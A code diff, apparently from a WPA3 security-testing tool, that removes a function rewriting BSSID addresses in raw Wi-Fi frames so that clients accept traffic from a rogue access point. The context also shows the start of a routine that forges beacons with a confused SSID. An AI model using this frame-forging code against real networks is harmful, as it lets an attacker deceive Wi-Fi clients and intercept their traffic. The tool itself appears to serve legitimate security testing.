@@ -6,33 +6,6 @@ namespace wpa3_tester::ssid_confusion {
 using namespace Tins;
 using namespace std;
 
-void SsidConfusion::translate_data_mac(frame_raw_t& raw,
-							   const HWAddress<6>& from_bssid,
-							   const HWAddress<6>& to_bssid) {
-	if(raw.size() < 24) return;
-
-	const uint16_t rt_len_raw = static_cast<uint16_t>(raw[2]) | (static_cast<uint16_t>(raw[3]) << 8);
-	const bool has_rt = raw[0] == 0 && rt_len_raw >= 8 && raw.size() >= rt_len_raw;
-	const size_t rt_len = has_rt ? rt_len_raw : 0;
-
-	if(raw.size() < rt_len + 16 + 6) return;
-
-	uint8_t* addr1 = raw.data() + rt_len + 4;
-	uint8_t* addr2 = raw.data() + rt_len + 10;
-	uint8_t* addr3 = raw.data() + rt_len + 16;
-
-	if(equal(from_bssid.begin(), from_bssid.end(), addr1))
-		ranges::copy(to_bssid, addr1);
-
-	// addr2 is BSSID in FromDS (AP->STA) frames - must be translated so the client
-	// accepts frames from what it thinks is the rogue AP
-	if(equal(from_bssid.begin(), from_bssid.end(), addr2))
-		ranges::copy(to_bssid, addr2);
-
-	if(equal(from_bssid.begin(), from_bssid.end(), addr3))
-		ranges::copy(to_bssid, addr3);
-}
-
 unique_ptr<Dot11Beacon> SsidConfusion::make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid) {
 	// BSSID kept identical to real AP
 	auto b = Dot11Beacon(real.addr1(), real.addr2());
